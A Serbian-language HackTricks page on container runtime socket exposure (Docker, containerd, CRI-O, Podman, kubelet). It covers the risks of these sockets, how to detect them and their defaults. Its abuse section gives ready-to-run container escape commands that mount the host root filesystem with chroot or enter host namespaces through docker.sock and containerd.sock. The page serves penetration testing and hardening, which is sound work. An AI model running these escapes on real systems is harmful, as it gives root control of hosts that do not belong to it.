# Runtime API i izlaganje daemona

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni kompromisi containera uopšte ne počinju namespace escape-om. Počinju pristupom kontrolnoj ravnini runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman, ili kubelet preko montiranog Unix socketa ili izloženog TCP listener-a, napadač može da zatraži novi container sa većim privilegijama, mount-uje host filesystem, pridruži se host namespaces, ili preuzme osetljive informacije o nodu. U tim slučajevima, runtime API predstavlja pravu sigurnosnu granicu, i kompromitovanje njega je funkcionalno blizu kompromitovanju hosta.

Zato izlaganje runtime socketa treba dokumentovati odvojeno od zaštite kernela. Container sa običnim seccomp, capabilities, and MAC confinement može i dalje biti udaljen samo jedan API poziv od kompromitacije hosta ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran unutar njega. Kernel izolacija tekućeg containera može raditi tačno onako kako je zamišljeno dok je runtime management plane u potpunosti izložen.

## Modeli pristupa daemona

Docker Engine tradicionalno izlaže svoj privilegovani API kroz lokalni Unix socket na `unix:///var/run/docker.sock`. Istorijski, takođe je bio izložen i na daljinu preko TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-zaštićenog listener-a na `2376`. Izlaganje daemona na daljinu bez jake TLS zaštite i autentifikacije klijenta efektivno pretvara Docker API u remote root interfejs.

containerd, CRI-O, Podman, i kubelet izlažu slične površine visokog uticaja. Imena i workflow-i se razlikuju, ali logika je ista. Ako interfejs dozvoljava pozivaocu da kreira workloads, mount-uje host puteve, preuzme kredencijale, ili menja pokrenute containere, interfejs je privilegovani management kanal i treba ga tako tretirati.

Uobičajeni lokalni putevi koje vredi proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starija ili specijalizovanija okruženja mogu takođe izlagati krajnje tačke kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Ove su ređe u savremenim okruženjima, ali kada se pojave treba ih tretirati istom pažnjom, jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikativne sokete.

## Siguran daljinski pristup

Ako daemon mora biti izložen van lokalnog socketa, veza treba biti zaštićena TLS-om i po mogućstvu obostrano autentifikovana, tako da daemon verifikuje klijenta, a klijent verifikuje daemon. Stara praksa otvaranja Docker daemona preko plain HTTP-a radi pogodnosti jedna je od najopasnijih grešaka u administraciji kontejnera, jer je površina API-ja dovoljno snažna da direktno kreira privilegovane kontejnere.

Istorijski Docker konfiguracioni obrazac je izgledao ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na systemd-based hostovima, komunikacija daemona može se takođe pojaviti kao `fd://`, što znači da proces nasleđuje prethodno otvoren socket od systemd umesto da ga sam direktno binduje. Važna lekcija nije tačna sintaksa već bezbednosna posledica. U trenutku kada daemon osluškuje izvan usko dozvoljenog lokalnog socket-a, transportna sigurnost i autentifikacija klijenta postaju obavezni umesto opcionog hardening-a.

## Zloupotreba

Ako runtime socket postoji, potvrdite koji je to, da li postoji kompatibilan klijent, i da li je moguć raw HTTP ili gRPC pristup:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ove komande su korisne jer razlikuju mrtvu putanju, montiran ali nedostupan socket i aktivni privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.

### Potpun primer: Docker Socket To Host Root

Ako je `docker.sock` dostupan, klasičan escape je pokrenuti novi container koji montira host root filesystem i potom izvršiti `chroot` u njega:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo omogućava direktno host-root execution preko Docker daemon. Uticaj nije ograničen na file reads. Kada se nađe unutar novog container, napadač može izmeniti host files, harvest credentials, implant persistence, ili pokrenuti dodatne privileged workloads.

### Potpun primer: Docker Socket To Host Namespaces

Ako napadač preferira namespace entry umesto filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ovaj put doseže host tako što traži od runtime-a da kreira novi container sa eksplicitnim izlaganjem host-namespace-a, umesto da eksploatiše trenutni.

### Kompletan primer: containerd Socket

Priključen `containerd` socket je obično podjednako opasan:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Uticaj je ponovo kompromitacija hosta. Čak i ako Docker-specific tooling nije prisutan, neki drugi runtime API i dalje može ponuditi iste administratorske mogućnosti.

## Checks

Cilj ovih provera je da odgovore da li kontejner može dostići bilo koju ravninu upravljanja koja je trebalo da ostane izvan granice poverenja.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Šta je zanimljivo ovde:

- Montiran runtime soket obično predstavlja direktan administrativni primitiv, a ne puko otkrivanje informacija.
- TCP listener na `2375` bez TLS treba smatrati uslovom za daljinsku kompromitaciju.
- Varijable okruženja kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran da komunicira sa host runtime-om.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano lokalni Unix soket | `dockerd` sluša na lokalnom soketu i daemon obično radi kao root | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slaba ili odsutna TLS zaštita na `2376` |
| Podman | Podrazumevano CLI bez demona | Za uobičajenu lokalnu upotrebu nije potreban dugotrajan privilegovani daemon; API soketi i dalje mogu biti izloženi kada je omogućena `podman system service` | izlaganje `podman.sock`, pokretanje servisa široko dostupno, korišćenje API-ja sa root privilegijama |
| containerd | Lokalni privilegovani soket | Administrativni API izložen preko lokalnog soketa i obično korišćen od strane alata višeg nivoa | montiranje `containerd.sock`, širok pristup `ctr` ili `nerdctl`, izlaganje privilegovanih namespaces |
| CRI-O | Lokalni privilegovani soket | CRI endpoint je namenjen za node-local pouzdane komponente | montiranje `crio.sock`, izlaganje CRI endpointa nepouzdanim workload-ima |
| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko dostupan iz Pods; pristup može otkriti stanje podova, kredencijale i mogućnosti izvršavanja u zavisnosti od authn/authz | montiranje kubelet soketa ili certs, slaba kubelet autentifikacija, host networking plus dostižan kubelet endpoint |
